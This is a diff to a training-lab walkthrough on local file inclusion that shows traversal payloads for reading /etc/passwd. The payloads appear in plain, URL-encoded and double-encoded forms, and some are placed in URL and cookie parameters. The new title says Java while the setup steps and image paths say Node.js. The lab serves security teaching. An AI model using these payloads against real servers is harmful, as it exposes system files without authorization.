@@ -1,10 +1,8 @@
-# KBID xxx - LFI-3
+# Java - Local File Inclusion 3 (LFI-3)
 
 ## Running the app nodeJs
 
-First make sure nodejs and npm are installed on your host machine.
-After installation, we go to the folder of the lab we want to practice.
-"i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following commands:
+First make sure nodejs and npm are installed on your host machine. After installation, we go to the folder of the lab we want to practice. "i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following commands:
 
 ```
 $ npm install
@@ -26,7 +24,7 @@ Warning: To successfully test for this flaw, the tester needs to have knowledge 
 
 Some Examples:
 
-```text
+```
 http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
 
 Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
@@ -52,16 +50,15 @@ Sensitive Information Disclosure
 
 Let us see how can we exploit the file inclusion vulnerability in a real world scenario, the application here allows us to view details on Intro, Chapter1, Chapter2 and so on.
 
-![](../../.gitbook/assets/java/LFI-3/1.png)
+![](../../.gitbook/assets/nodejs/LFI-3/1.png)
 
-![](../../.gitbook/assets/java/LFI-3/2.png)
+![](../../.gitbook/assets/nodejs/LFI-3/2.png)
 
-We could try to modify the "intro" item and attempt to access the world-readable /etc/passwd file by directory traversal.
-This will not work since the webserver does not accept the '../' sequence at all.
+We could try to modify the "intro" item and attempt to access the world-readable /etc/passwd file by directory traversal. This will not work since the webserver does not accept the '../' sequence at all.
 
 We might success if we URL encode our payload(../../../../../../../etc/passwd) like this:
 
-```Text
+```
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 ```
 
@@ -69,18 +66,17 @@ It seems not to work...
 
 Let's try to double URL encode our payload like this:
 
-```Text
+```
 %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```
 
 Or like this:
 
-```Text
+```
 %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%65%74%63%25%32%66%70%61%73%73%77%64
 ```
 
-![](../../.gitbook/assets/java/LFI-3/3.png)
-![](../../.gitbook/assets/java/LFI-3/4.png)
+![](../../.gitbook/assets/nodejs/LFI-3/3.png) ![](../../.gitbook/assets/nodejs/LFI-3/4.png)
 
 Success! As we observed, we can access the /etc/passwd file through LFI.
 
